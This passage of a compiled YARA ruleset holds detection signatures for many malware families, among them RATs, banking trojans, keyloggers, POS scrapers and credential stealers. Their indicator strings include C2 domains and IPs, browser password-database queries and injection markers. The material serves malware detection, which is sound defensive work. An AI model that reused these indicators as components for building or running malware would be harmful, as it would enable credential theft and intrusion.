		$f = "__fxstat64" nocase ascii wide
		$g = "accept" nocase ascii wide
		$h = "__lxstat" nocase ascii wide
		$i = "__lxstat64" nocase ascii wide
		$j = "open" nocase ascii wide
		$k = "rmdir" nocase ascii wide
		$l = "__xstat" nocase ascii wide
		$m = "__xstat64" nocase ascii wide
		$n = "unlink" nocase ascii wide
		$o = "unlikat" nocase ascii wide
		$p = "fdopendir" nocase ascii wide
		$q = "opendir" nocase ascii wide
		$r = "readdir" nocase ascii wide
		$s = "readdir64" nocase ascii wide
	condition:
		($a or $b) and 8 of them
}

rule keylogger
{
        meta:
                author="xorseed"
                reference="https://stuff.rop.io/"
	strings:
		$a = "XListInputDevices" ascii wide
		$b = "XOpenDevice" ascii wide
		$c = "XOpenIM" ascii wide
		$d = "XGetIMValues" ascii wide
		$e = "XmbLookupString" ascii wide
		$f = "XFree" ascii wide
		$g = "XCreateIC" ascii wide
		$h = "XOpenDisplay" ascii wide
		$i = "XNextEvent" ascii wide
		$j = "XInternAtom" ascii wide
		$k = "XSelectExtensionEvent" ascii wide
		$l = "XFreeDeviceList" ascii wide
		$m = "XGetWindowProperty" ascii wide
		$n = "XkbKeycodeToKeysym" ascii wide
	condition:
		all of them
}
/*
    This Yara ruleset is under the GNU-GPLv2 license (http://www.gnu.org/licenses/gpl-2.0.html) and open to any user or organization, as    long as you use it under this license.

*/

import "pe"


rule rtf_multiple
{
meta:
	author = "@patrickrolsen"
	maltype = "Multiple"
	version = "0.1"
	reference = "fd69a799e21ccb308531ce6056944842" 
	date = "01/04/2014"
strings:
	$rtf = { 7b 5c 72 74 ?? ?? } // {\rt01 {\rtf1 {\rtxa
    	$string1  = "author user"
	$string2   = "title Vjkygdjdtyuj" nocase
	$string3    = "company ooo"
	$string4  = "password 00000000"
condition:
    ($rtf at 0) and (all of ($string*))
}
/*
    This Yara ruleset is under the GNU-GPLv2 license (http://www.gnu.org/licenses/gpl-2.0.html) and open to any user or organization, as    long as you use it under this license.

*/

import "pe"

rule tran_duy_linh
{
meta:
	author = "@patrickrolsen"
	maltype = "Misc."
	version = "0.2"
	reference = "8fa804105b1e514e1998e543cd2ca4ea, 872876cfc9c1535cd2a5977568716ae1, etc." 
	date = "01/03/2014"
strings:
	$doc = {D0 CF 11 E0} //DOCFILE0
	$string1 = "Tran Duy Linh" fullword
	$string2 = "DLC Corporation" fullword
condition:
    ($doc at 0) and (all of ($string*))
}

rule misc_iocs
{
meta:
	author = "@patrickrolsen"
	maltype = "Misc."
	version = "0.1"
	reference = "N/A" 
strings:
	$doc = {D0 CF 11 E0} //DOCFILE0
	$s1 = "dw20.exe"
	$s2 = "cmd /"
condition:
    ($doc at 0) and (1 of ($s*))
}

rule malicious_LNK_files
{
meta:
	author = "@patrickrolsen"
strings:
	$magic = {4C 00 00 00 01 14 02 00} // L.......
	$s1 = "\\RECYCLER\\" wide
	$s2 = "%temp%" wide
	$s3 = "%systemroot%\\system32\\cmd.exe" wide
	//$s4 = "./start" wide
	$s5 = "svchost.exe" wide
	$s6 = "lsass.exe" wide
	$s7 = "csrss.exe" wide
	$s8 = "winlogon.exe" wide
	//$s9 = "%cd%" wide
	$s10 = "%appdata%" wide
	$s11 = "%programdata%" wide
	$s12 = "%localappdata%" wide
	$s13 = ".cpl" wide
condition:
	($magic at 0) and any of ($s*)
}

rule memory_pivy

{
   meta:
	  author = "https://github.com/jackcr/"
   strings:
      $a = {00 00 00 00 00 00 00 00 00 00 00 53 74 75 62 50 61 74 68 00} // presence of pivy in memory

   condition: 
      any of them

}

rule memory_shylock

{
   meta:
	  author = "https://github.com/jackcr/"

   strings:
      $a = /pipe\\[A-F0-9]{32}/     //Named pipe created by the malware
      $b = /id=[A-F0-9]{32}/     //Portion or the uri beacon
      $c = /MASTER_[A-F0-9]{32}/     //Mutex created by the malware
      $d = "***Load injects by PIPE (%s)" //String found in binary
      $e = "***Load injects url=%s (%s)" //String found in binary
      $f = "*********************** Ping Ok ************************" //String found in binary
      $g = "*** LOG INJECTS *** %s"     //String found in binary

   condition: 
      any of them

}

rule ScanBox_Malware_Generic {
	meta:
		description = "Scanbox Chinese Deep Panda APT Malware http://goo.gl/MUUfjv and http://goo.gl/WXUQcP"
		author = "Florian Roth"
		reference1 = "http://goo.gl/MUUfjv"
		reference2 = "http://goo.gl/WXUQcP"
		date = "2015/02/28"
		hash1 = "8d168092d5601ebbaed24ec3caeef7454c48cf21366cd76560755eb33aff89e9"
		hash2 = "d4be6c9117db9de21138ae26d1d0c3cfb38fd7a19fa07c828731fa2ac756ef8d"
		hash3 = "3fe208273288fc4d8db1bf20078d550e321d9bc5b9ab80c93d79d2cb05cbf8c2"
	strings:
		/* Sample 1 */
		$s0 = "http://142.91.76.134/p.dat" fullword ascii
		$s1 = "HttpDump 1.1" fullword ascii
		
		/* Sample 2 */
		$s3 = "SecureInput .exe" fullword wide
		$s4 = "http://extcitrix.we11point.com/vpn/index.php?ref=1" fullword ascii
		
		/* Sample 3 */
		$s5 = "%SystemRoot%\\System32\\svchost.exe -k msupdate" fullword ascii
		$s6 = "ServiceMaix" fullword ascii		
		
		/* Certificate and Keywords */
		$x1 = "Management Support Team1" fullword ascii
		$x2 = "DTOPTOOLZ Co.,Ltd.0" fullword ascii
		$s3 = "SEOUL1" fullword ascii
	condition:
		( 1 of ($s*) and 2 of ($x*) ) or 
		( 3 of ($x*) )
}

rule TrojanDownloader {
	meta:
		description = "Trojan Downloader - Flash Exploit Feb15"
		author = "Florian Roth"
		reference = "http://goo.gl/wJ8V1I"
		date = "2015/02/11"
		hash = "5b8d4280ff6fc9c8e1b9593cbaeb04a29e64a81e"
		score = 60
	strings:
		$x1 = "Hello World!" fullword ascii
		$x2 = "CONIN$" fullword ascii
			
		$s6 = "GetCommandLineA" fullword ascii
		$s7 = "ExitProcess" fullword ascii
		$s8 = "CreateFileA" fullword ascii						

		$s5 = "SetConsoleMode" fullword ascii		
		$s9 = "TerminateProcess" fullword ascii	
		$s10 = "GetCurrentProcess" fullword ascii
		$s11 = "UnhandledExceptionFilter" fullword ascii
		$s3 = "user32.dll" fullword ascii
		$s16 = "GetEnvironmentStrings" fullword ascii
		$s2 = "GetLastActivePopup" fullword ascii		
		$s17 = "GetFileType" fullword ascii
		$s19 = "HeapCreate" fullword ascii
		$s20 = "VirtualFree" fullword ascii
		$s21 = "WriteFile" fullword ascii
		$s22 = "GetOEMCP" fullword ascii
		$s23 = "VirtualAlloc" fullword ascii
		$s24 = "GetProcAddress" fullword ascii
		$s26 = "FlushFileBuffers" fullword ascii
		$s27 = "SetStdHandle" fullword ascii
		$s28 = "KERNEL32.dll" fullword ascii
	condition:
		$x1 and $x2 and ( all of ($s*) ) and filesize < 35000
}


rule Cloaked_as_JPG {
        meta:
                description = "Detects a cloaked file as JPG"
                author = "Florian Roth (eval section from Didier Stevens)"
                date = "2015/02/29"
                score = 70
        strings:
                $ext = "extension: .jpg"
        condition:
                $ext and uint16be(0x00) != 0xFFD8
}



rule rtf_yahoo_ken
{
meta:
	author = "@patrickrolsen"
	maltype = "Yahoo Ken"
	filetype = "RTF"
	version = "0.1"
	description = "Test rule"
	date = "2013-12-14"
strings:
	$magic1 = { 7b 5c 72 74 30 31 } // {\rt01
	$magic2 = { 7b 5c 72 74 66 31 } // {\rtf1
	$magic3 = { 7b 5c 72 74 78 61 33 } // {\rtxa3
	$author1 = { 79 61 68 6f 6f 20 6b 65 63 } // "yahoo ken"
condition:
	($magic1 or $magic2 or $magic3 at 0) and $author1
} 


rule ZXProxy
{
meta:
	author = "ThreatConnect Intelligence Research Team"
	
strings:
	$C = "\\Control\\zxplug" nocase wide ascii
	$h = "http://www.facebook.com/comment/update.exe" wide ascii
	$S = "Shared a shell to %s:%s Successfully" nocase wide ascii
condition:
	any of them
}

rule OrcaRAT
{
    meta:
        Author      = "PwC Cyber Threat Operations"
        Date        = "2014/10/20" 
        Description = "Strings inside"
        Reference   = "http://pwc.blogs.com/cyber_security_updates/2014/10/orcarat-a-whale-of-a-tale.html"

    strings:
        $MZ = "MZ"
        $apptype1 = "application/x-ms-application"
        $apptype2 = "application/x-ms-xbap"
        $apptype3 = "application/vnd.ms-xpsdocument"
        $apptype4 = "application/xaml+xml"
        $apptype5 = "application/x-shockwave-flash"
        $apptype6 = "image/pjpeg"
        $err1 = "Set return time error =   %d!"
        $err2 = "Set return time   success!"
        $err3 = "Quit success!"

    condition:
        $MZ at 0 and filesize < 500KB and (all of ($apptype*) and 1 of ($err*))
}

rule EmiratesStatement 
{
	meta:
		Author 		= "Christiaan Beek"
		Date 		= "2013-06-30"
		Description = "Credentials Stealing Attack"
		Reference 	= "https://blogs.mcafee.com/mcafee-labs/targeted-campaign-steals-credentials-in-gulf-states-and-caribbean"
		
		hash0 = "0e37b6efe5de1cc9236017e003b1fc37"
		hash1 = "a28b22acf2358e6aced43a6260af9170"
		hash2 = "6f506d7adfcc2288631ed2da37b0db04"
		hash3 = "8aebade47dc1aa9ac4b5625acf5ade8f"
	
	strings:
		$string0 = "msn.klm"
		$string1 = "wmsn.klm"
		$string2 = "bms.klm"
	
	condition:
		all of them
}

rule PUP_InstallRex_AntiFWb {
	meta:
		description = "Malware InstallRex / AntiFW"
		author = "Florian Roth"
		date = "2015-05-13"
		hash = "bb5607cd2ee51f039f60e32cf7edc4e21a2d95cd"
		score = 65
	strings:
		$s4 = "Error %u while loading TSU.DLL %ls" fullword ascii
		$s7 = "GetModuleFileName() failed => %u" fullword ascii
		$s8 = "TSULoader.exe" fullword wide
		$s15 = "\\StringFileInfo\\%04x%04x\\Arguments" fullword wide
		$s17 = "Tsu%08lX.dll" fullword wide
	condition:
		uint16(0) == 0x5a4d and all of them
}

rule LightFTP_fftp_x86_64 {
	meta:
		description = "Detects a light FTP server"
		author = "Florian Roth"
		reference = "https://github.com/hfiref0x/LightFTP"
		date = "2015-05-14"
		hash1 = "989525f85abef05581ccab673e81df3f5d50be36"
		hash2 = "5884aeca33429830b39eba6d3ddb00680037faf4"
		score = 50
	strings:
		$s1 = "fftp.cfg" fullword wide
		$s2 = "220 LightFTP server v1.0 ready" fullword ascii
		$s3 = "*FTP thread exit*" fullword wide
		$s4 = "PASS->logon successful" fullword ascii
		$s5 = "250 Requested file action okay, completed." fullword ascii
	condition:
		uint16(0) == 0x5a4d and filesize < 250KB and 4 of them
}

rule LightFTP_Config {
	meta:
		description = "Detects a light FTP server - config file"
		author = "Florian Roth"
		reference = "https://github.com/hfiref0x/LightFTP"
		date = "2015-05-14"
		hash = "ce9821213538d39775af4a48550eefa3908323c5"
	strings:
		$s2 = "maxusers=" wide
		$s6 = "[ftpconfig]" fullword wide
		$s8 = "accs=readonly" fullword wide
		$s9 = "[anonymous]" fullword wide
		$s10 = "accs=" fullword wide
		$s11 = "pswd=" fullword wide
	condition:
		uint16(0) == 0xfeff and filesize < 1KB and all of them
}

rule SpyGate_v2_9
{
	meta:
		date = "2014/09"
		maltype = "Spygate v2.9 Remote Access Trojan"
		filetype = "exe"
		reference = "https://blogs.mcafee.com/mcafee-labs/middle-east-developer-spygate-struts-stuff-online"
	strings:
		$1 = "shutdowncomputer" wide
		$2 = "shutdown -r -t 00" wide
		$3 = "blockmouseandkeyboard" wide
		$4 = "ProcessHacker"
		$5 = "FileManagerSplit" wide
	condition:
		all of them
}

rule PythoRAT
{
	meta:
		author = " Kevin Breen <kevin@techanarchy.net>"
		date = "2014/04"
		ref = "http://malwareconfig.com/stats/PythoRAT"
		maltype = "Remote Access Trojan"
		filetype = "exe"

	strings:
		$a = "TKeylogger"
		$b = "uFileTransfer"
		$c = "TTDownload"
		$d = "SETTINGS"
		$e = "Unknown" wide
		$f = "#@#@#"
		$g = "PluginData"
		$i = "OnPluginMessage"

	condition:
		all of them
}

rule VirusRat
{
	meta:
		author = " Kevin Breen <kevin@techanarchy.net>"
		date = "2014/04"
		ref = "http://malwareconfig.com/stats/VirusRat"
		maltype = "Remote Access Trojan"
		filetype = "exe"

	strings:
		$string0 = "virustotal"
		$string1 = "virusscan"
		$string2 = "abccba"
		$string3 = "pronoip"
		$string4 = "streamWebcam"
		$string5 = "DOMAIN_PASSWORD"
		$string6 = "Stub.Form1.resources"
		$string7 = "ftp://{0}@{1}" wide
		$string8 = "SELECT * FROM moz_logins" wide
		$string9 = "SELECT * FROM moz_disabledHosts" wide
		$string10 = "DynDNS\\Updater\\config.dyndns" wide
		$string11 = "|BawaneH|" wide

	condition:
		all of them
}

rule ice_ix_12xy : banker
{
	meta:
		author = "Jean-Philippe Teissier / @Jipe_"
		description = "ICE-IX 1.2.x.y trojan banker"
		date = "2013-01-12"
		filetype = "memory"
		version = "1.0" 
	
	strings:
		$regexp1= /bn1=.{32}&sk1=[0-9a-zA-Z]{32}/
		$a = "bn1="
		$b = "&sk1="
		$c = "mario"								//HardDrive GUID artifact
		$d = "FIXME"
		$e = "RFB 003.003"							//VNC artifact
		$ggurl = "http://www.google.com/webhp"

	condition:
		$regexp1 or ($a and $b) or all of ($c,$d,$e,$ggurl) 
}
rule qadars : banker
{
	meta:
		author = "Jean-Philippe Teissier / @Jipe_"
		description = "Qadars - Mobile part. Maybe Perkele."
		version = "1.0" 
		filetype = "memory"
		ref1 = "http://www.lexsi-leblog.fr/cert/qadars-nouveau-malware-bancaire-composant-mobile.html"

	strings:
		$cmd1 = "m?D"
		$cmd2 = "m?S"
		$cmd3 = "ALL"
		$cmd4 = "FILTER"
		$cmd5 = "NONE"
		$cmd6 = "KILL"
		$cmd7 = "CANCEL"
		$cmd8 = "SMS"
		$cmd9 = "DIVERT"
		$cmd10 = "MESS"
		$nofilter = "nofilter1111111"
		$botherderphonenumber1 = "+380678409210"

	condition:
		all of ($cmd*) or $nofilter or any of ($botherderphonenumber*)
}
rule shylock :  banker
{
	meta:
		author = "Jean-Philippe Teissier / @Jipe_"
		description = "Shylock Banker"
		date = "2013-12-12" 
		version = "1.0" 
		ref1 = "http://iocbucket.com/iocs/1b4660d57928df5ca843c21df0b2adb117026cba"
		ref2 = "http://www.trusteer.com/blog/merchant-fraud-returns-%E2%80%93-shylock-polymorphic-financial-malware-infections-rise"
		ref3 = "https://www.csis.dk/en/csis/blog/3811/"

	strings:
		$process1 = "MASTER"
		$process2 = "_SHUTDOWN"
		$process3 = "EVT_VNC"
		$process4 = "EVT_BACK"
		$process5 = "EVT_VNC"
		$process6 = "IE_Hook::GetRequestInfo"
		$process7 = "FF_Hook::getRequestInfo"
		$process8 = "EX_Hook::CreateProcess"
		$process9 = "hijackdll.dll"
		$process10 = "MTX_"
		$process11 = "FF::PR_WriteHook entry"
		$process12 = "FF::PR_WriteHook exit"
		$process13 = "HijackProcessAttach::*** MASTER *** MASTER *** MASTER *** %s PID=%u"
		$process14 = "HijackProcessAttach::entry"
		$process15 = "FF::BEFORE INJECT"
		$process16 = "FF::AFTER INJECT"
		$process17 = "IE::AFTER INJECT"
		$process18 = "IE::BEFORE INJECT"
		$process19 = "*** VNC *** VNC *** VNC *** VNC *** VNC *** VNC *** VNC *** VNC *** VNC *** VNC *** %s"
		$process20 = "*** LOG INJECTS *** %s"
		$process21 = "*** inject to process %s not allowed"
		$process22 = "*** BackSocks *** BackSocks *** BackSocks *** BackSocks *** BackSocks *** BackSocks *** BackSocks *** %s"
		$process23 = ".?AVFF_Hook@@"
		$process24 = ".?AVIE_Hook@@"
		$process25 = "Inject::InjectDllFromMemory"
		$process26 = "BadSocks.dll"	
		$domain1 = "extensadv.cc"
		$domain2 = "topbeat.cc"
		$domain3 = "brainsphere.cc"
		$domain4 = "commonworldme.cc"
		$domain5 = "gigacat.cc"
		$domain6 = "nw-serv.cc"
		$domain7 = "paragua-analyst.cc"
		
	condition:
		3 of ($process*) or any of ($domain*)
}
rule spyeye : banker
{
	meta:
		author = "Jean-Philippe Teissier / @Jipe_"
		description = "SpyEye X.Y memory"
		date = "2012-05-23" 
		version = "1.0" 
		filetype = "memory"

	strings:
		$spyeye = "SpyEye"
		$a = "%BOTNAME%"
		$b = "globplugins"
		$c = "data_inject"
		$d = "data_before"
		$e = "data_after"
		$f = "data_end"
		$g = "bot_version"
		$h = "bot_guid"
		$i = "TakeBotGuid"
		$j = "TakeGateToCollector"
		$k = "[ERROR] : Omfg! Process is still active? Lets kill that mazafaka!"
		$l = "[ERROR] : Update is not successfull for some reason"
		$m = "[ERROR] : dwErr == %u"
		$n = "GRABBED DATA"
		
	condition:
		$spyeye or (any of ($a,$b,$c,$d,$e,$f,$g,$h,$i,$j,$k,$l,$m,$n))
}

rule spyeye_plugins : banker
{
	meta:
		author = "Jean-Philippe Teissier / @Jipe_"
		description = "SpyEye X.Y Plugins memory"
		date = "2012-05-23" 
		version = "1.0" 
		filetype = "memory"

	strings:
		$a = "webfakes.dll"
		$b = "config.dat"			//may raise some FP
		$c = "collectors.txt"
		$d = "webinjects.txt"
		$e = "screenshots.txt"
		$f = "billinghammer.dll"
		$g = "block.dll"			//may raise some FP
		$h = "bugreport.dll"		//may raise some FP
		$i = "ccgrabber.dll"
		$j = "connector2.dll"
		$k = "creditgrab.dll"
		$l = "customconnector.dll"
		$m = "ffcertgrabber.dll"
		$n = "ftpbc.dll"
		$o = "rdp.dll"				//may raise some FP
		$p = "rt_2_4.dll"
		$q = "socks5.dll"			//may raise some FP
		$r = "spySpread.dll"
		$s = "w2chek4_4.dll"
		$t = "w2chek4_6.dll"
	
	condition:
		any of them
}

rule callTogether_certificate
{
    meta:
        Author      = "Fireeye Labs"
        Date        = "2014/11/03" 
        Description = "detects binaries signed with the CallTogether certificate"
        Reference   = "https://www.fireeye.com/blog/threat-research/2014/11/operation-poisoned-handover-unveiling-ties-between-apt-activity-in-hong-kongs-pro-democracy-movement.html"

    strings:
        $serial = { 45 21 56 C3 B3 FB 01 76 36 5B DB 5B 77 15 BC 4C }
        $o = "CallTogether, Inc."

    condition:
        $serial and $o
}

rule qti_certificate
{
    meta:
        Author      = "Fireeye Labs"
        Date        = "2014/11/03" 
        Description = "detects binaries signed with the QTI International Inc certificate"
        Reference   = "https://www.fireeye.com/blog/threat-research/2014/11/operation-poisoned-handover-unveiling-ties-between-apt-activity-in-hong-kongs-pro-democracy-movement.html"

    strings:
        $cn = "QTI International Inc"
        $serial = { 2e df b9 fd cf a0 0c cb 5a b0 09 ee 3a db 97 b9 }

    condition:
        $cn and $serial
}

rule DownExecute_A
{
	meta:
        Author      = "PwC Cyber Threat Operations :: @tlansec"
        Date        = "2015/04/27"
        Description = "Malware is often wrapped/protected, best to run on memory"
        Reference   = "http://pwc.blogs.com/cyber_security_updates/2015/04/attacks-against-israeli-palestinian-interests.html"

    strings:
        $winver1 = "win 8.1"
        $winver2 = "win Server 2012 R2"
        $winver3 = "win Srv 2012"
        $winver4 = "win srv 2008 R2"
        $winver5 = "win srv 2008"
        $winver6 = "win vsta"
        $winver7 = "win srv 2003 R2"
        $winver8 = "win hm srv"
        $winver9 = "win Strg srv 2003"
        $winver10 = "win srv 2003"
        $winver11 = "win XP prof x64 edt"
        $winver12 = "win XP"
        $winver13 = "win 2000"

        $pdb1 = "D:\\Acms\\2\\docs\\Visual Studio 2013\\Projects\\DownloadExcute\\DownloadExcute\\Release\\DownExecute.pdb"
        $pdb2 = "d:\\acms\\2\\docs\\visual studio 2013\\projects\\downloadexcute\\downloadexcute\\downexecute\\json\\rapidjson\\writer.h"
        $pdb3 = ":\\acms\\2\\docs\\visual studio 2013\\projects\\downloadexcute\\downloadexcute\\downexecute\\json\\rapidjson\\internal/stack.h"
        $pdb4 = "\\downloadexcute\\downexecute\\"

        $magic1 = "<Win Get Version Info Name Error"
        $magic2 = "P@$sw0rd$nd"
        $magic3 = "$t@k0v2rF10w"
        $magic4 = "|*|123xXx(Mutex)xXx321|*|6-21-2014-03:06PM" wide

		$str1 = "Download Excute" ascii wide fullword
        $str2 = "EncryptorFunctionPointer %d"
        $str3 = "%s\\%s.lnk"
        $str4 = "Mac:%s-Cpu:%s-HD:%s"
        $str5 = "feed back responce of host"
        $str6 = "GET Token at host"
        $str7 = "dwn md5 err"

    condition:
        all of ($winver*) or any of ($pdb*) or any of ($magic*) or 2 of ($str*)
}

rule CVE_2015_1674_CNGSYS {
	meta:
		description = "Detects exploits for CVE-2015-1674"
		author = "Florian Roth"
		reference = "http://www.binvul.com/viewthread.php?tid=508"
		reference2 = "https://github.com/Neo23x0/Loki/blob/master/signatures/exploit_cve_2015_1674.yar"
		date = "2015-05-14"
		hash = "af4eb2a275f6bbc2bfeef656642ede9ce04fad36"
	strings:
		$s1 = "\\Device\\CNG" fullword wide
		
		$s2 = "GetProcAddress" fullword ascii
		$s3 = "LoadLibmalware_rary" ascii
		$s4 = "KERNEL32.dll" fullword ascii
		$s5 = "ntdll.dll" fullword ascii
	condition:
		uint16(0) == 0x5a4d and filesize < 60KB and all of them
}

rule Ap0calypse
{
	meta:
		author = " Kevin Breen <kevin@techanarchy.net>"
		date = "2014/04"
		ref = "http://malwareconfig.com/stats/Ap0calypse"
		maltype = "Remote Access Trojan"
		filetype = "exe"

	strings:
		$a = "Ap0calypse"
		$b = "Sifre"
		$c = "MsgGoster"
		$d = "Baslik"
		$e = "Dosyalars"
		$f = "Injecsiyon"

	condition:
		all of them
}
rule Arcom
{
	meta:
		author = " Kevin Breen <kevin@techanarchy.net>"
		date = "2014/04"
		ref = "http://malwareconfig.com/stats/Arcom"
		maltype = "Remote Access Trojan"
		filetype = "exe"
        
    strings:
        $a1 = "CVu3388fnek3W(3ij3fkp0930di"
        $a2 = "ZINGAWI2"
        $a3 = "clWebLightGoldenrodYellow"
        $a4 = "Ancestor for '%s' not found" wide
        $a5 = "Control-C hit" wide
        $a6 = {A3 24 25 21}
        
    condition:
        all of them
}
rule Bandook
{

	meta:
		author = " Kevin Breen <kevin@techanarchy.net>"
		date = "2014/04"
		ref = "http://malwareconfig.com/stats/bandook"
		maltype = "Remote Access Trojan"
		filetype = "exe"
        
    strings:
    		$a = "aaaaaa1|"
            $b = "aaaaaa2|"
            $c = "aaaaaa3|"
            $d = "aaaaaa4|"
			$e = "aaaaaa5|"
			$f = "%s%d.exe"
			$g = "astalavista"
			$h = "givemecache"
			$i = "%s\\system32\\drivers\\blogs\\*"
			$j = "bndk13me"
			

        
    condition:
    		all of them
}

rule DarkRAT
{
	meta:
		author = " Kevin Breen <kevin@techanarchy.net>"
		date = "2014/04"
		ref = "http://malwareconfig.com/stats/DarkRAT"
		maltype = "Remote Access Trojan"
		filetype = "exe"

	strings:
		$a = "@1906dark1996coder@"
		$b = "SHEmptyRecycleBinA"
		$c = "mciSendStringA"
		$d = "add_Shutdown"
		$e = "get_SaveMySettingsOnExit"
		$f = "get_SpecialDirectories"
		$g = "Client.My"

	condition:
		all of them
}
rule Greame
{
	meta:
		author = " Kevin Breen <kevin@techanarchy.net>"
		date = "2014/04"
		ref = "http://malwareconfig.com/stats/Greame"
		maltype = "Remote Access Trojan"
		filetype = "exe"
		
	strings:
    		$a = {23 23 23 23 40 23 23 23 23 E8 EE E9 F9 23 23 23 23 40 23 23 23 23}
            $b = {23 23 23 23 40 23 23 23 23 FA FD F0 EF F9 23 23 23 23 40 23 23 23 23}
            $c = "EditSvr"
            $d = "TLoader"
			$e = "Stroks"
            $f = "Avenger by NhT"
			$g = "####@####"
			$h = "GREAME"
			

        
    condition:
    		all of them
}
rule LostDoor
{
	meta:
		author = " Kevin Breen <kevin@techanarchy.net>"
		date = "2014/04"
		ref = "http://malwareconfig.com/stats/LostDoor"
		maltype = "Remote Access Trojan"
		filetype = "exe"
        
    strings:
    	$a0 = {0D 0A 2A 45 44 49 54 5F 53 45 52 56 45 52 2A 0D 0A}
        $a1 = "*mlt* = %"
        $a2 = "*ip* = %"
        $a3 = "*victimo* = %"
        $a4 = "*name* = %"
        $b5 = "[START]"
        $b6 = "[DATA]"
        $b7 = "We Control Your Digital World" wide ascii
        $b8 = "RC4Initialize" wide ascii
        $b9 = "RC4Decrypt" wide ascii
        
    condition:
    	all of ($a*) or all of ($b*)
}
rule LuxNet
{
	meta:
		author = " Kevin Breen <kevin@techanarchy.net>"
		date = "2014/04"
		ref = "http://malwareconfig.com/stats/LuxNet"
		maltype = "Remote Access Trojan"
		filetype = "exe"

	strings:
		$a = "GetHashCode"
		$b = "Activator"
		$c = "WebClient"
		$d = "op_Equality"
		$e = "dickcursor.cur" wide
		$f = "{0}|{1}|{2}" wide

	condition:
		all of them
}
rule Pandora
{
	meta:
		author = " Kevin Breen <kevin@techanarchy.net>"
		date = "2014/04"
		ref = "http://malwareconfig.com/stats/Pandora"
		maltype = "Remote Access Trojan"
		filetype = "exe"

	strings:
		$a = "Can't get the Windows version"
		$b = "=M=Q=U=Y=]=a=e=i=m=q=u=y=}="
		$c = "JPEG error #%d" wide
		$d = "Cannot assign a %s to a %s" wide
		$g = "%s, ProgID:"
		$h = "clave"
		$i = "Shell_TrayWnd"
		$j = "melt.bat"
		$k = "\\StubPath"
		$l = "\\logs.dat"
		$m = "1027|Operation has been canceled!"
		$n = "466|You need to plug-in! Double click to install... |"
		$0 = "33|[Keylogger Not Activated!]"

	condition:
		all of them
}
rule Paradox
{
	meta:
		author = " Kevin Breen <kevin@techanarchy.net>"
		date = "2014/04"
		ref = "http://malwareconfig.com/stats/Paradox"
		maltype = "Remote Access Trojan"
		filetype = "exe"

	strings:
		$a = "ParadoxRAT"
		$b = "Form1"
		$c = "StartRMCam"
		$d = "Flooders"
		$e = "SlowLaris"
		$f = "SHITEMID"
		$g = "set_Remote_Chat"

	condition:
		all of them
}
rule Punisher
{
	meta:
		author = " Kevin Breen <kevin@techanarchy.net>"
		date = "2014/04"
		ref = "http://malwareconfig.com/stats/Punisher"
		maltype = "Remote Access Trojan"
		filetype = "exe"

	strings:
		$a = "abccba"
		$b = {5C 00 68 00 66 00 68 00 2E 00 76 00 62 00 73}
		$c = {5C 00 73 00 63 00 2E 00 76 00 62 00 73}
		$d = "SpyTheSpy" wide ascii
		$e = "wireshark" wide
		$f = "apateDNS" wide
		$g = "abccbaDanabccb"

	condition:
		all of them
}
rule SmallNet
{
	meta:
		author = " Kevin Breen <kevin@techanarchy.net>"
		date = "2014/04"
		ref = "http://malwareconfig.com/stats/SmallNet"
		maltype = "Remote Access Trojan"
		filetype = "exe"
		
	strings:
		$split1 = "!!<3SAFIA<3!!"
		$split2 = "!!ElMattadorDz!!"
		$a1 = "stub_2.Properties"
		$a2 = "stub.exe" wide
		$a3 = "get_CurrentDomain"

	condition:
		($split1 or $split2) and (all of ($a*))
}
rule Base64_encoded_Executable {
	meta:
		description = "Detects an base64 encoded executable (often embedded)"
		author = "Florian Roth"
		date = "2015-05-28"
		score = 50
	strings:
		$s1 = "TVpTAQEAAAAEAAAA//8AALgAAAA" // 14 samples in goodware archive
		$s2 = "TVoAAAAAAAAAAAAAAAAAAAAAAAA" // 26 samples in goodware archive
		$s3 = "TVqAAAEAAAAEABAAAAAAAAAAAAA" // 75 samples in goodware archive
		$s4 = "TVpQAAIAAAAEAA8A//8AALgAAAA" // 168 samples in goodware archive
		$s5 = "TVqQAAMAAAAEAAAA//8AALgAAAA" // 28,529 samples in goodware archive
	condition:
		1 of them
}
rule CredStealESY : For CredStealer
{
 meta:
description = "Generic Rule to detect the CredStealer Malware"
author = "IsecG – McAfee Labs"
date = "2015/05/08"
strings:
$my_hex_string = "CurrentControlSet\\Control\\Keyboard Layouts\\" wide //malware trying to get keyboard layout
$my_hex_string2 = {89 45 E8 3B 7D E8 7C 0F 8B 45 E8 05 FF 00 00 00 2B C7 89 45 E8} //specific decryption module
 condition:
$my_hex_string and $my_hex_string2
}
/*
    This Yara ruleset is under the GNU-GPLv2 license (http://www.gnu.org/licenses/gpl-2.0.html) and open to any user or organization, as    long as you use it under this license.

*/
rule Mozart
{
   meta:
       author = "Nick Hoffman - Morphick Inc"
       description = "Detects samples of the Mozart POS RAM scraping utility"
       reference = "http://securitykitten.github.io/the-mozart-ram-scraper/"
   strings:
       $pdb = "z:\\Slender\\mozart\\mozart\\Release\\mozart.pdb" nocase wide ascii
       $output = {67 61 72 62 61 67 65 2E 74 6D 70 00}
       $service_name = "NCR SelfServ Platform Remote Monitor" nocase wide ascii
       $service_name_short = "NCR_RemoteMonitor"
       $encode_data = {B8 08 10 00 00 E8 ?? ?? ?? ?? A1 ?? ?? ?? ?? 53 55 8B AC 24 14 10 00 00 89 84 24 0C 10 00 00 56 8B C5 33 F6 33 DB 8D 50 01 8D A4 24 00 00 00 00 8A 08 40 84 C9 ?? ?? 2B C2 89 44 24 0C ?? ?? 8B 94 24 1C 10 00 00 57 8B FD 2B FA 89 7C 24 10 ?? ?? 8B 7C 24 10 8A 04 17 02 86 E0 BA 40 00 88 02 B8 ?? ?? ?? ?? 46 8D 78 01 8D A4 24 00 00 00 00 8A 08 40 84 C9 ?? ?? 2B C7 3B F0 ?? ?? 33 F6 8B C5 43 42 8D 78 01 8A 08 40 84 C9 ?? ?? 2B C7 3B D8 ?? ?? 5F 8B B4 24 1C 10 00 00 8B C5 C6 04 33 00 8D 50 01 8A 08 40 84 C9 ?? ?? 8B 8C 24 20 10 00 00 2B C2 51 8D 54 24 14 52 50 56 E8 ?? ?? ?? ?? 83 C4 10 8B D6 5E 8D 44 24 0C 8B C8 5D 2B D1 5B 8A 08 88 0C 02 40 84 C9 ?? ?? 8B 8C 24 04 10 00 00 E8 ?? ?? ?? ?? 81 C4 08 10 00 00}
   condition:
      any of ($pdb, $output, $encode_data) or
      all of ($service*)
}
/*
    This Yara ruleset is under the GNU-GPLv2 license (http://www.gnu.org/licenses/gpl-2.0.html) and open to any user or organization, as    long as you use it under this license.

*/

import "pe"

rule NaikonCode : Naikon Family 
{
    meta:
        description = "Naikon code features"
        author = "Seth Hardy"
